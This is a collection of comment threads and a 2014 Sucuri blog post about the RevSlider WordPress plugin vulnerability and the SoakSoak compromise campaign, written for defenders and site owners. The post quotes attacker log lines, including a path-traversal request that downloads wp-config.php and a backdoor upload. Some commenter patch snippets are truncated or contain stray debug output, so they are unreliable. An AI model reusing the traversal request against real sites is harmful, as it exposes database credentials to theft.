    I can confirm that having the latest Wordfence + preFebruary RevSlider together IS NOT SECURE.

    If anyone is using Wordfence maybe received this by email: IT¨S WRONG.

    Email received:

    SUBJECT:

    [WordPress Security] File Download Vulnerability in the Slider Revolution Premium WordPress Plugin
     BODY:

    Dear WordPress Publisher,

    If you would like to stop receiving WordPress security alerts and product updates from Wordfence, you can click here. You subscribed to this list via the Wordfence security plugin for WordPress. If you find this alert helpful, please give us a 5 star rating on WordPress.org.

    A commercial plugin called Slider Revolution had a vulnerability which was fixed in February. Many themes rely on this plugin and are using old versions of Slider Revolution which has left sites vulnerable to the exploit. Attacks on the old version of Slider Revolution are now being seen in the wild.

    The vulnerability lets a hacker download any file from your system including your wp-config.php file which contains database passwords and other sensitive data.

    What to do: If you are using the free or paid version of Wordfence, we have just released Wordfence 5.2.2 which blocks this attack on Slider Revolution, even if you have a vulnerable version installed. So you’re already protected if you upgraded to Wordfence 5.2.2 released today.

    If you have Wordfence auto-update enabled then you will automatically be upgraded to Wordfence 5.2.2 within the next 24 hours and will be protected from this attack. If you want to enable Wordfence auto-update, go to your Wordfence options page and check the box titled “Update Wordfence automatically when a new version is released” and hit “Save”.

    If you are running Slider Revolution, please make sure that you are running at least version 4.2 which contains the fix released in February. You can find Slider Revolution on the ThemePunch website at: <http://themepunch.com/revolution/> if you need to grab the latest version or contact them. You may also need to contact your theme developer if they bundled this plugin with your theme.

    If you found this alert helpful, please give us a 5 star rating on WordPress.org on the right of the page.

          You can contact the theme vendor and ask them to provide you an updated version of the plugin. If they are unwilling or unavailable, you can purchase the latest version of the plugin for $18.

          You can als patch this yourself by editing the niteImageViewRev::outputImage() function in revslider/inc\_php/framework/image\_view.class.php. Personally, I added two lines to check if the file extension is an image. This will protect wp-config.php and other non-image files, but I believe the latest version of the plugin is more comprehensive in this, checking the file name against the WordPress media library.

    As has been demonstrated elsewhere in the comments, moving wp-config.php up a folder is still susceptible to this vulnerability by modifying the attack URL. In your particular case, the version of the plugin installed is not vulnerable to this exploit, so feel free to publicly post that URL to your heart’s content.

       This patch isn’t as comprehensive as what the plugin author provided in version 4.2 but it will at least limit the plugin’s access to images. In the file ‘inc\_php/framework/image\_view.class.php’ look for private function ‘outputImage’ at about line 142 and make the changes outlined here: <https://gist.github.com/karpstrucking/8e86502c27eaa2182021/revisions>

    You can just block the call to your wp-admin folder by a simpke htaccess command. That would have prevented any of these calls either way regardless the leak.

Our testing shows that we have in fact provided an effective block for this attack vector so I want to investigate why this isn’t working for you.

    Thanks,

       I had to check, because I was only webmastering the site:
        The problem came from the template itself: neighborhood by envato and the way they bundled it:
        <http://themeforest.net/item/neighborhood-responsive-multipurpose-shop-theme/5086341>

       So that RevSlider was not updateable from wp-admin, so the admins never knew about the updates. Of course the Admins weren´t aware that the server was compromised.

       We were hacked on 31.08 (and before), during quarantine we found this article and we were able to a exploit ourselves easily.

    Hi All,

    I just wanted to link to a post about this from Envato (disclaimer I work for them): <http://marketblog.envato.com/general/plugin-vulnerability/>.

    That post outlines what we’re doing, links to a list of themes which were potentially affected, and has information for users on to get an updated version of the plugin (they can get this for free) etc.

    We’ll be be contacting all buyers of the potentially affected themes via email address and making sure they are aware of the situation and what they should do.

    We’ve been going through the list of potentially affected items, checking them and disabling if they still have an affected version of the plugin. Once the authors have updated their themes to include a fixed version of the plugin, we’ll re-activate them.

    Any questions, let me know! Also, if anyone notices any security issues with a ThemeForest or CodeCanyon item in future, please let me know so we can take action.

    Cheers,
     Stephen

       If there is anything that Envato can learn from this, it is that from this point forward they should prohibit theme authors to bundle plugins. I mean have you had a look at the list of affected themes??? It’s not even funny how many there are!

       Why can’t a plugin come as a recommended plugin? How difficult is it for a theme author to include a conditional statement like `if ( is\_plugin\_active( ‘plugin-directory/plugin-file.php’ ) ) {
        //plugin is activated
        }`

       If you want to release a theme on the official WP.org Themes Repo it is strictly prohibited to bundle plugins, now why would you think that is? To make it more difficult for theme-authors to release themes or perhaps simply for reasons of security?!

       Envato is ultimately responsible for ALL of this!

    The plugin author seems to be being criticized for releasing a fix, but not informing user base of the vulnerability. At the risk of sounding stupid… Im wondering whats so wrong with that appoach? With plugins there are always users who do not apply updates. Publishing details of a security vulnerability seems like a great way to expose those users to easier attack? What is the recommended best practice for authors in situations like this? Thanks.

       Hello Maeve,

       The reason author is being criticized for that is because the plugin is a premium plugin that doesn’t easily auto update without extra work for it. So many site owners might go through the tedious updating process based on the news feed that the author is giving them when a new release is made. If they see some small bug fixes or feature changes that don’t really affect them on everyday basis then they might prolong the update.

       I believe the developer should have notified users who purchased the developer/extended license, ie theme developers who integrated the plugin into their themes, so that they could update their themes with the newer version of the plugin code.

          Yes, CodePeach you are absolutely correct and agree with you 100%. Choosing to update/fix the vulnerability silently is fine as long as every single person/developer/whoever else has a copy of the plugin with the vulnerability in it is notified. To me that is where the breakdown occurred. ie what did not happen is bulk/mass emails sent to developers using the vulnerable plugin version so that they could then update the plugin. Blaming theme authors/developers for not updating the plugin does not seem appropriate to me. Kind of passing the blame onto someone else unfairly in my opinion. If you make a mistake own it and do whatever it takes to get everything straightenend out.

    It is great to see that Envato is taking this seriously and making free updates available to those in need.

    One of the points made from the plugin author was that they do not have the ability to reach out to purchasers via email. Based on the quote below, I should think that if an Envato merchant finds themselves in a similar situation in the future, they should reach out to Envato directly for assistance in making sure all purchasers are informed/updated.

    “We’ll be be contacting all buyers of the potentially affected themes via email address and making sure they are aware of the situation and what they should do.”

       Would you mind sending me a copy of 4.2.3 to look at? I only have 3.0.95 and 4.2.2 but my copy of 4.2.2 is not vulnerable. lucas@gowp.com Thanks!

    If you have it bundled with a theme themeforest/envato theme, you can request the latest version and they’ll send it to you. Then if you have a newer copy, you can go into revolution slider from the wp admin main left nav (don’t go to plugins). Once in the revslider admin interface, on the bottom right corner there’s a button to upgrade the plugin. Press it, and upload the newer copy you have and it’ll overwrite the old one, even if it doesn’t acknowledge that an update is pending.

    @blueprintmarketing:disqus I talked with Flywheel and they actually said it wouldn’t do anyone any good getting a wp-config file from one of their sites.

    “Due to the way we structure our servers and databases on Flywheel, there is little to nothing that someone could possibly do with access to the wp-config file. Since we don’t have a forward facing database manager aside from the one inside your Flywheel account, it’s pretty much a dead end….There’s no way to connect to the database externally, so having that information (password in config) doesn’t do them any good.”

    Another benefit of managed WP Hosting!

    Hi All,

    Note, that the list contains \*all\* themes that mention the affected plugins, even themes that were released yesterday and have the latest version of the plugin.

    We’re being conservative due to the seriousness of this issue. We can’t be sure that the theme developer isn’t using a version of the plugin they downloaded long ago, so we’re including everything.

    From what I’ve seen, quite a few of the themes on the list have either been fixed long ago or never had the problem. Others are affected. We’ve also started seeing quite a few updates coming through from theme authors to address this.

    Also, note the following that I’ve cut and pasted from [our forums](http://themeforest.net/forums/thread/important-serious-vulnerability-in-revolution-slider-showbiz-pro-wordpress-plugins/141396?page=3):

    > The list contains all themes that reference either Revolution Slider or Showbiz Pro in their item description. We’ve taken a conservative approach due to the seriousness and urgency of the situation
    >  We’ll continue to update the list as we receive new information — i.e., confirmation themes do or don’t need to be there — from our developers. While we’ve made every effort to identify affected themes, if you’re an author of an affected theme not in the list please email me here.
    >  The number one priority right now is that all affected buyers are aware of the situation and take necessary steps to protect themselves. Thanks for your patience and understanding.

    I have a very strange issue. Im using Themepunch theme and my hosting provider ran a script and disabled my slider revolution plugin. After having a chat with him I asked them to revert the plugin so that I can update the plugin. When they did so, I can’t update the plugin. When I click update plugin its asking me to locate the revolution.zip.

    How should I go about it. It’s a purchased theme. The slider came with the theme.

          If you log in to your ThemeForest account and visit the Revolution Slider page, you should have a download link in the top-right corner. Extract that file and revslider.zip is contained within.

    It seems to be a damned if you do, damned if you dont situation. If they announce the vulnerability, then people will be attacked, but if they dont then the themes that package this in with the theme are unaware and have no motivation to upgrade.

    This is a huge issue as the themes listed by ThemeForest includes 1099 themes! Most of the themes I have seen using Revolution Slider include it in with the theme.

    I recently saw notifications for updates for the plugin, which on one site worked and on another site failed (running the same theme). I contacted the developer who told me not to update as they use an old version of the plugin and had no plans to update in the near future.

    If ThemeForest does see that the theme has a major issue such as using an old version of Revolution Slider, they remove the item. This means that you have no way to contact the author and no way to view support options, its just a 404 page. Come on ThemeForest, get your act together.

       The latest version of the plugin is not affected by the vulnerability discussed in this article, so you’re safe to use it. The inability to upload is most likely an unrelated coincidence. Do you get an error when you try uploading? Some web hosts have a low default upload limit that you may have to increase via a custom php.ini file or .htaccess rule.

    You’ve got to be f\*cking kidding me! Talk about a vulnerability that is far reaching! Considering the popularity of the Revolution Slider, this is really bad and of the Heartbleed variety in scope. It’s unacceptable to me that the authors of the slider didn’t anticipate or consider this “../readthisfile” type of URL attack!

    You can download the newest update for Brandon, then find revolution slider in the zip and update it manually. Revolution Slider will be updated to 4.6.0. Correct me if I’m wrong but won’t this fix the vulnerability?

    ThemePunch’s handling of this is a complete joke. I just found out about this vulnerability from Envato (thankfully), but horray for me, this exploit has already been in the wild for over a month. If you visit the Revolution Slider homepage, they barely mention the exploit except for a 1-line notification at the top. They don’t even provide instructions on how to install the update file. (I figured it out, after digging on Google). No mention of the vulnerability on their homepage, either. ThemePunch, you dropped the ball, and you continue to drop it. Why is it that everybody is talking about this except for you?

    Any form of “hiding” is not real security. Moving the wp-config.php file to a higher directory is technically a “hiding” tactic and is just one of many bad security misinformation myths that you will unfortunately find all over the Internet. If a file or anything else is protected with real security measures then it does not matter where the file or anything else exists because it would be protected with real security measures.

    Easy enough to path, just the fallow to the top of the “admin-ajax.php” files after the php tags “<?php" and comments. And make sure apache/httpd/etc are all chrooted.
     [CODE]
     if ( strpos($\_GET['img'],'wp-config.php') !== FALSE || substr($\_GET['img'], -4 ) == '.php') {

    There is a quick patch for old Avada installations, that would be pain to be updated:

    1. Depending on your version of Avada open:
     wp-content/themes/Avada/framework/plugins/revslider/inc\_php/image\_view.class.php
     or
     wp-content/plugins/revslider/inc\_php/framework/image\_view.class.php

    2. Replace the “showImageFromGet()” method with the following code:
     ==========================================
     /\*\*
     \*
     \* show image from get params
     \*/
     public function showImageFromGet(){

    //$imageFilename = UniteFunctionsRev::getGetVar(“img”);
     $imageID = intval(UniteFunctionsRev::getGetVar(“img”));
     $maxWidth = UniteFunctionsRev::getGetVar(“w”,-1);
     $maxHeight = UniteFunctionsRev::getGetVar(“h”,-1);
     $type = UniteFunctionsRev::getGetVar(“t”,””);

    //set effect
     $effect = UniteFunctionsRev::getGetVar(“e”);
     $effectArgument1 = UniteFunctionsRev::getGetVar(“ea1″);

    if(!empty($effect))
     $this->setEffect($effect,$effectArgument1);

    $this->showImageByID($imageID);
     echo ‘sechs’;
     //$this->showImage($imageFilename,$maxWidth,$maxHeight,$type);
     }
     ==========================================
     3. Add the following method somewhere in the same file:
     ==========================================
     private function showImageByID($fileID, $maxWidth=-1, $maxHeight=-1, $type=””){
     $fileID = intval($fileID);

    if($fileID == 0) $this->throwError(“image not found”);

    $img = wp\_get\_attachment\_image\_src( $fileID, ‘thumb’ );

    if(empty($img)) $this->throwError(“image not found”);

    $this->outputImage($img[0]);

    exit();
     }
     ==========================================

    I was having serious speed issues because of this attack. I checked my log files and found out several trials do get the wp-config.php file, eventualy they manage to get it. I don’t have any of the plugins or themes here identified, but the attacks were causing severe speed issues on my site.
     I solved it moving my wp-config.php file one level up (out of the public\_html folder), also changed the database password. My site became almost instantly normal and fast.
     Thanks for this alert, hope this will help others 😉

    You can also protect wp-config.php in your htaccess-file. Is this is a waterproof solution?

       Yes you DO need to update it urgently. Welcome to website construction and maintenance. NEVER think of a site as ‘Finished’. ALWAYS maintenance to do.

       you should use a child theme instead of the main theme — that way you can always update your main theme without having your website change (at least most of the time that is the case)

    Something tried to access my website using this url:

    /library.php/wp-content/themes/beach\_apollo/thumb.php

    Wed Dec 31 10:06 pm (Taipei time)

    My site is totally independent of WP. Just thought I would mention it. Not sure if it’s related.

    Stuff happens like this often enough where some ‘bot’ creates a WP url that my site records but won’t allow anyone/anything access to. I just lock ’em out.

    Please if anyone is being pushed by NetworkSolutions (web.com) to buy SiteLock to fix the hack on your shared account, DO NOT buy it, because it won’t work. Read below (and let me know, by replying here)

    And please like thumbs up this so this stays close to the top to help others.

    Last week NetWork solutions suspended one of our client’s account because of this.
     They took the time to make a LONG email, explaining WHY they are giving us the names of a few files infected, not the file list, but every time you request the lift of the suspension, the answer with DIFFERENT filenames. It’s obvious that there are not thousands of peoples checking each account. The message is automatically created and THEY KNOW which the files are. So instead of telling you, they partnered with SiteLock, and you pay to NS and end up in SiteLock with the account setup.

    The problem is IT HASN’T SCANNED IN 4 DAYS, and it won’t.
     It seems (although you gave the FTP credentials) that since the site is suspended, it can’t verify your ownership for a second scan. The first scan still shows “pending” and I have no idea why it depends on the frond end to run. It might just be useless.

    So NS is SELLING (they bill you) SiteLock, WHILE IS USELESS for the case.

    I contacted NS and they said they’ve been instructed not to offer SiteLock anymore, but I guess that’s the lie for me, because it’s in the notes of my previous call.

    Please let me know if you are offered SiteLock for this (or other) subject of suspension. That way we’ll have proofs of them doing it on purpose.

    Opposite excuses by their reps show they sell it on purpose:

    -They stated not to profit from that, but the bill comes from them.

    -The first email said there were INFECTED files (didn’t say “some of your files”) so they KNOW they are not just your stuff. They KNOW HOW and WHICH files are infected

    -They first rep stated the email advicing “…or using SiteLock to remove all infected…” was automated… but the third email DIDN’T suggest installing SiteLock. Either it’s taken out automatically because the sale was complete, or the email was manually edited.

    -The last rep apologized by the bad information the others provided me, and admitted the email was edited manually. So they COULD have pasted the whole list of known hacked files…

    -The first rep told me they KNEW the infected file is sending the emails (I pointed out the mentioned file was a JOOMLA file, this website runs on WordPress). The last rep even mocked me “Unfortunately hackers do not make the subject of the email say what file is sending it.”

    My site was critically hacked and this was the reason. My theme depends upon it but I have no way of updating it or purchasing from my site so I left it dormant on my site. Well, hours before a presentation to 300 people of my website I was hacked. I’m so disgusted by this experience. I have no problem paying for a theme, but why don’t you sell me the entire package upon purchase? Why do I have to hire another developer, pay them, to tell me my problem is to come back and pay themeforest more money for something I already paid for? Sounds criminal. What the hell is the fix

    I use the Avada theme and installed the Revolution Slider plugin as requested by the theme when I installed the theme a month ago. And a week ago Wordfence sent me a notice that there was malware soaksoak in the BackupBuddy file. So I had Wordfence delete the malware zip file.

    But then it came up again as a notice by Wordfence today. So I deleted the file via Wordfence and did some more research and came upon this post. So I have deleted the Revolution Slider plugin, since I’m not using that plugin right now in the theme — and will see if I get another notice about the malware in the coming days.

# RevSlider Vulnerability Leads To Massive WordPress SoakSoak Compromise

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* December 15, 2014

Yesterday we disclosed a [large malware campaign targeting and compromising over 100,000 WordPress sites](https://blog.sucuri.net/2014/12/soaksoak-malware-compromises-100000-wordpress-websites.html), and growing by the hour. It was named SoakSoak due to the first domain used in the malware redirection path (soaksoak.ru).

After a bit more time investigating this issue, we were able to confirm that the attack vector is the RevSlider plugin. We [disclosed a serious vulnerability with this plugin a few months ago](https://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html), it seems that many webmasters have either not heard of or did not take seriously the vulnerability.

The biggest issue is that the RevSlider plugin is a premium plugin, it’s not something everyone can easily upgrade and that in itself becomes a disaster for website owner. Some website owners don’t even know they have it as it’s been packaged and bundled into their themes. We’re currently remediating thousands of sites and when engaging with our clients many had no idea the plugin was even within their environment.

##### The Attack Sequence

We have investigated thousands of compromised sites with this injection and based on the logs, we are able to confirm the exact attack vector being targeted.

1. **Discovery**: There appears to be an initial reconnaissance scan occurring where the attacker[s] are looking to see if the file exists. Snippet of the code

> 94.153.8.126 – – [14/Dec/2014:09:59:35 -0500] “GET /wp-content/plugins/revslider/rs-plugin/font/revicons.eot HTTP/1.1” 200
>
> 94.190.20.83 – – [14/Dec/2014:00:12:07 -0500] “GET /wp-admin/admin-ajax.php?action=revslider\_show\_image&img=../wp-config.php HTTP/1.0” 202

The first entry looks for the **revicons.eot** files and the second one attempts to use one of the Revslider vulnerabilities to download the wp-config.php file.

1. **Exploit:**If the discovery phase is successful and they find a site using Revslider, they use a second vulnerability in Revslider and attempt to upload a malicious theme to the site:
   > 94.153.8.126 – – [14/Dec/2014:04:31:28 -0500] “POST /wp-admin/admin-ajax.php HTTP/1.1” 200 4183 “-”
   >  Content-Disposition: form-data; revslider\_ajax\_action
   >  update\_plugin; name=”update\_file”;…
2. **Take over:** If the exploit is successful, they inject the popular **Filesman** backdoor into the website, which they access directly at ***/wp-content/plugins/revslider/temp/update\_extract/revslider/update.php*** this provides full access by circumventing existing access controls:
   > 94.153.8.126 – – [14/Dec/2014:04:31:28 -0500] “GET /wp-content/plugins/revslider/temp/update\_extract/revslider/update.php HTTP/1.1” 200 5287
   >  “-” “Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0”

From there, they inject a secondary backdoor that modifies the **swfobject.js** file and injects the malware redirecting site visitors to **soaksoak.ru**.

This campaign is also making use of a number of new backdoor payloads, some are being injected into images to further assist evasion and others are being used to inject new administrator users into the WordPress installs, giving them even more control long term. Some users are clearing infections and getting reinfected within minutes and the reason is because of the complex nature of the payloads and improper cleaning efforts.

##### Do not just clean these 2 files!

We are hearing a lot of recommendations online to just replace the swfobject.js and template-loader.php files to remove the infection.

It does remove the infection, but does not address the left over backdoors and initial entry points. The website will be reinfected quickly. If you are affected by this, expect to find yourself riddled with backdoors and infections, you have to not only clean, but also stop all malicious attacks. You can stop malicious attacks through the use of a [Website Firewall](http://sucuri.net/website-firewall/), ours or someone else, just use a Firewall, a real one preferably.

   It is also happening on wordpress installs without the Revolution Slider? I think Rev slider isn’t the only problem

   Am I on crack or is Ars actually affected by this? All I see is a css file referring to Arse technica, a youtube video background, and links to some twitter accounts

   Thomas – at a minimum ‘showbiz’ is also affected. The file structure in that plugin looks like it may be basically a revslider clone. Whatever it is exactly, it suffers from the same problem of allowing files to be uploaded to a /temp/update\_extract/ folder inside the plugin, and it is being compromised by similar attacks.

      Hi Chris,

      please make sure that you have Showbiz version 1.5.3 (for the mentioned Vulnerability issue in Showbiz) and as best 1.7.2 for all bug and vulnerability issue fix.
       Slider Revolution Bug has been fixed back in February, and has been discussed many times in different forums, and also here at Sucuri in October. For Slider Revolution you should have 4.2 or newer. As best version 4.6.5 as latest version.

      If you follow our update instructions (weekly posted and tweeted) your system can not be affected.

      Thanks again for your understanding !

   We don’t use anything like ‘showbiz’ or RevSlider in any of our sites. Neither have they be used before.

      You may be using it but aren’t aware… I would do a full scan of your site to be sure.

         Nope, it’s using a custom theme without those 2 plugins.

   How would I scan my website to see if it’s infected? I do not have either of the 2 plugins installed btw but I want to make sure it hasn’t found another way in?

   As the developer of the Slider Revolution Responsive WordPress Plugin (referred to as “RevSlider” in this article), we would like to clarify a few things to offer some additional transparency on what has happened in the last year.

   In february 2014, a critical vulnerabilty was discovered in our Slider Revolution WordPress Plugin which we immediately fixed in Version 4.2.

   In fact, only versions 4.1.4 or below, allow for the vulnerability and have to be updated.

   Direct buyers of our plugin were hardly affected by the exploit, as they could use our automatic update tool to keep their plugin up to date and secure.

   The nature of plugins bundled in themes however caused a lot of older plugin versions to linger around on the web and providing a window for malicious attacks.

   Envato, the marketplace, that we are selling our products on, has released an in-depth article on the issue with nessecary steps to take for plugin users: <http://marketblog.envato.com/news/plugin-vulnerability/>

   Also note, that on our product page of Slider Revolution, a “free-update” button with a direct download to the latest version has been available to buyers of themes that contain our plugin, ever since september 2014.

   The title of this post suggests that there is another exploit in the Slider Revolution plugin.

   However, it’s the SAME security vulnerability that is being talked about here has already been covered thoroughly in the media.

   We can only apologize for the security issue once more. It’s in our best interest to increase web security standards and make the life of web developers easier in the future!

      Version 4.2 or newer of Slider Revolution is not affected. 4.2 was released in February 2014. Latest version is 4.6.5. On our homepage you find a free PunchTool which informs you about the latest versions and the needs of updates of all our plugins. Thank you !

    “This campaign is also making use of a number of new backdoor payloads”

    We have recently seen WP and other LAMP stack attacks using .htaccess files to allow non PHP files (\*.js/\*.png etc) to actually execute as PHP. This is done by adding an AddType directive into .htaccess.

    This further obfuscates intrusion as you cannot rely on finding \*.php files in upload directories. A quick check we often do is look for \*.php files in upload directories in CMS software. Typically standard upload directories never have PHP files uploaded.

    “It seems that many webmasters have either not heard of or did not take seriously the vulnerability.”

    Many WP site owners have little knowledge about what is included in their sites. This is just not limited to small business owners. Some of the largest companies we serve have outsourced their WP development. As a result, they often do not know what is embedded in their site,

       You are right, though worth noting a few of those may be the same vulnerable plugin bundled into various themes.

    To ThemePunch the developer of the comprised slider: Given that this has affected a lot of websites why not make the update available to all users of the plugin directly from the plugin itself? It would show you as fully responsive to all, not just your direct buyers. Anyone using the plug in has paid for it somewhere but the responsibility for the widespread fix should be yours. You would regain respect quickly in the marketplace for a decisive action like that. What you’re saying, in effect at the moment is “if you bought direct we’ll help” “if you didn’t – go sort it out yourself, we’re not responsible”. That’s a shame given that you appear to have made and sold a vulnerable product.

       The issue is that they don’t control themes with a bundled version of the plugin. Many themes with it bundled don’t even show the plugin as being installed in wp-admin so there is no way to update it other than manually deleting and uploading the files within the theme. It’s not the plugin developer selling a vulnerable product, it is the theme developers and marketplaces that should be blamed for not updating the bundled plugin within the themes they sell.

          Fair point. Then maybe the resellers also. But I have seen that plug in listed separately in some themes but with no direct ability to update from the plug in. If that could be a “required” feature from the developer for everyone re-selling the plug in then it may close the potential for security attacks.

             It’s been a known issue for years to not bundle plugins within themes though. It’s not recommended development of extending WordPress. All plugins should live within the wp-content/plugins directory. The bundled themes I’ve seen have the plugin in it’s own directory within the theme, so it will appear to not even be installed when checking the plugins page, which is where updating occurs. When you’re dealing with open source and millions of developers, developers will code outside of standards and create security issues. It’s not necessarily the job of the original plugin developer to police how their code is implemented or modified. They also shouldn’t have to modify their code to work with unsupported implementations.

             Theme Forest, Envato, and other marketplaces use the bundled plugins as selling points. Sometimes these plugins are not even licensed properly and most bundled plugins do not give you access to the support/purchase history that purchasing directly from the developer would. For those who do decide to bundle plugins with a theme, it would make more sense to just include the plugin in a zip file, informing the purchaser how to properly install it just like any other plugin. The reason they probably don’t do that is to get around licensing or they are really creating custom implementations that they shouldn’t be doing.

             Point is…you can’t trust bundled plugins.

       Since September we have a free update version available ! Clicking on the “Download Free Update” at our product page gives you the latest available version of our Plugin. Anyone who get the plugins via Themes bundled, or get the plugin via Codecanyon we send or offer a free update file.

       We do answer on any mail and comments which reach us, sending updated version to anyone (without any purchase code or other informations needed).

       Since the only legal way to own our products is to get it via a Theme bundled, or purchase it at envato by codecanyon, we dont see for who else we are responsible to deliver free updates?

          I appreciate your reply. The point I’m making is this: If an article on December 15 from a site that deals with security is still seeing this as a problem then more has to be seen to be done to avert future occurrences. Otherwise this could hurt how the plug in is valued by future potential customers. The “more” I’m suggesting is that you build the plug in so that it can only be bundled with an “update” feature and notification that comes to the WP-dashboard. Is this not technically possible? If hackers are targeting your plug in, they are discrediting your work. Make it harder for them to succeed. I’m not being critical. I’m making a pro-active suggestion. If it’s not technically possible then so be it. But if it’s a difficult task, it might be worth tackling now while you have the attention of a lot of people who may be future customers.

             Hi,

             really appreciate your feedback. We have an update function in our plugin since version 4.2 which shows the user if any new features are also available. Also we created a free plugin which is available due our hompage to get informed about the level of your ThemePunch plugins (up to date, low risk update available, high risk update available etc.) We also added now a new newsletter function in the plugins where customers independent of Theme Authors can register themself and get informations about updates. Furthermore we added a feature which allows any customers to get an update even if they never purchased the item, in case there is any high risk update available.

             We are really happy and thankful for all creative and clever feedbacks like yours to make our products and the web much more secure !

             Thanks a lot again,

             ThemePunch

    Hi, I had RevSlider 4.1.1 on one site but updated it today to 4.6.3. However, I just found a new admin user called WPguest with a strange email address. I have deleted the user but what else should I do to make the site secure again? I did a scan here on sucuri which said the the site was safe – but can the malware still hide somewhere?

    What an article.. I would be ashamed to write things like this.. The vulnerability was fixed almost one year ago, why posting lies like this now? People who were never affected loose credibility in both plugin & theme developers just because untrue articles like yours.

       Please elaborate why this article is “untrue”. Please tell me how you could support a plugin that has no update feature within wordpress? Please tell me where I could find this update for free version and/or paid version? It is simple: I have to move to another plugin or my ISP deletes my account and blacklists me.

          The plugin was fixed last year in February. You can easily download the latest version of the plugin from ThemeForest, where you’ve bought it. The plugin does have an update feature within WordPress, you just need a license for it since it’s a commercial plugin.

          This article is untrue because it is about a really old vulnerability which was fixed a looong time ago.

             Actually, it has NOT been fixed, and not only were we compromised 3 weeks ago even though we’ve kept everything up to date, but low and behold we were compromised again last night. We thought from before the compromise was due to a theme issue, but now we’ve finally recognized that the issue culminated from within the Revslider folder, and we have since removed it entirely.

                Hi Deasel,

                sorry for the trouble.

                It was indeed fixed in February 2014. Updating the plugin won’t delete the backdoors though and you still need your server to be scanned.

                If you face any issue you can always contact our support team.

                Thanks and cheers, ThemePunch

       Sorry Ruben, but my sites were hacked only last week. One of them had an updated Revslider 4.6.5, which by all accounts, should have fixed the issue.

    also, I went to your site and I don’t see a link to be able to upload an update of the Rev Slider that is free… I bought a template through envato / themeforest and your plugin came packaged with it… the update link on your site goes to a link on that same marketplace and I gotta buy it, I would think in a situation like this, you guys would provide the free update. I already purchased it through a bundled template, which I assume you authorized them to use the revslider. If you did, please let us know where that can be gotten. Thanks.

    I am seeing an unusual trait of hackers trying to upload a vulnerable version of revslider. It seems that they are attempting to exploit other files and use that to upload the vulnerable revslider.
     Then again, I have seen a huge attack swing by daily that tries to upload various zip and php files. Thankfully, our security blocked them all.

       Hi, thanks for asking, if your theme was listed from Envato having an exploitable version you will find the button on the top right corner of the item description page on CodeCanyon (we are not allowed to post links here because Sucuri would block the comment if we do). If you cannot find that button there and have a version below 4.2 please open a ticket at our support forum. Please keep in mind that we only will answer to tickets that follow civilised communication rules. Thanks and Cheers, ThemePunch

       Honestly, just accept the fact that this plugin is comparable to the Ford Pinto, and since it’s so dangerous to use it should just be shoved off a cliff (would no doubt explode on impact) and given it’s proper burial. I can’t even begin to explain how many hours we lost on trying to recover after we were blacklisted from Google thanks to our business website showing malicious code from this issue 3 weeks ago, and thank God we were able to catch it in time this morning before Google crawled our site and once again blacklisted us.

       What would have been the responsible thing for the developer to do in this case was to alert all their customers of this highly dangerous issue, but just like the auto manufacturers that try and save face by waiting until they’re forced to issue a public recall, these guys decided to post an update that you would have to search for AFTER you’ve been compromised, and then make it such a pain to do that you just remove it entirely. For those that have 50+ sites like Krojack, doing an update via FTP is so daunting a task that it’s just not worth it to keep this plugin and take the chance of another exploit down the road.

       Hi,

       sorry to read that. Unfortunately updating the plugin after being hacked does not mean that all backdoors put in some files on the server are deleted too. You need to use a tool like Wordfence or your hosting company to scan the server.

       Cheers, ThemePunch

    I always disliked this WP Plugin because it didn’t have a way to update like other plugins. I will no longer buy themes that use this plugin. Going through 50+ sites once in a while updating plugins can be time consuming but at least it’s easy. The method to update this one on top of that really takes a lot more time, not that I can even FIND the updates to download.

    Also I don’t see this “Download Free Update” anywhere on their site. All I see is them wanting to sell the slider.

       Hi,

       please do not use this third-party plugin because it just adds more vulnerabilities to your WordPress server, different vectors. We had a real, ethical hacker check our plugin version > 4.1.4 and the vulnerability is wiped out.

       We do not earn money the more themes are sold btw. and the download button is still there for themes that include vulnerable version of the Revolution Slider. In case your theme author missed that 40 updates somehow and you have such a version of Slider in your theme and still the button is missing please report this to the Envato support. This way other users of the theme can benefit from this too.

       Thanks and cheers, ThemePunch

    It’s not really clear from this article how to fix this issue (for the non programmers amongst us).

    Are the files mentioned located in the revolution slider plugin folders or elsewhere on the site?

    Is this problem fixed by removing and reinstalling revolution slider and adding a firewall or are further steps needed?

    On fever there are a few “seo professionals” who install their own version of revslider for $5. Perhaps that’s one of the issue. If one of these ‘webmasters” uses their old, out dated and pirated version, the end user has no means of updating it. Though the end user is responsible in this case to use crappy sites like fever or seoclerk to buy rev slider installations…

       Hi,

       thanks for the feedback and sorry for any inconvenience.

       The vulnerability was fixed in February 2014 (Version 4.2), no theme is allowed with an old version of Revolution Slider on Envato Marketplaces. The email you mention went out in September 2014 by Envato, please check your spam folder also. Clients and Theme Authors who bought the RevSlider are always informed when there is an update (current version 4.6.5, 40 updates since 4.2) via mail all the time and should update their plugin or themes bundle.

       We are not allowed to post links here. So please visit the Codecanyon item page of Revolution Slider. The search input field will help you there. You will find a “Download update” button there if your bought theme contained an old version of the plugin.

       If you have bought a theme from ThemeForest recently that included an old version of the Revolution Slider (<4.1.4) please contact the Envato support so they can take action against that theme author spreading it.

       In general it is a good thing to keep your WordPress and Plugins and Themes up-to-date like the huge vulnerabilities from WordPress itself (Version 3.9) and other plugins recently tell too. Just a general word of wisdom.

       Thanks and cheers, ThemePunch

          I know this was a year ago but I have to chime in here. The Avada Theme bundled your (still vulnerable) plugin with their theme. Because of licensing, we cannot upgrade your plugin until Avada releases a new version unless we buy your plugin directly from you. Therefore, we have to pay for the theme, then pay for your plugin, simply because your plugin can’t stay safe enough between Avada release and require auto updating so we constantly stay safe.

          You’re holding vulnerability updates hostage. If not you, then someone else, all because of licensing and a chance to earn more.

          Stop.

          Dan Lee

    It is not clear for the programmers, either 🙂
     So, I’m discovering this stuff, 2 years after it happened, I just been hacked a few days ago on 2 different wordpress sites, and NONE of them had (seemingly) revslider. But unfortunately, the poort quality of most plugins in the wp repository, allow the bundling on questionable-quality plugins and stuff like this slider. With that being said, I always wonder, as a human being, why would these idiotic “hackers” waste their lives – and the time of others – to do harm this way to people who’ve never hurt them, attacking their sites, and potentially destroying their businesses and lives ? What the hell do they gain from it, seriously ? How lifeless, how clueless you have to be, as a “hacker”, to waste your life on this planet with stupid, mindless stuff like this ?
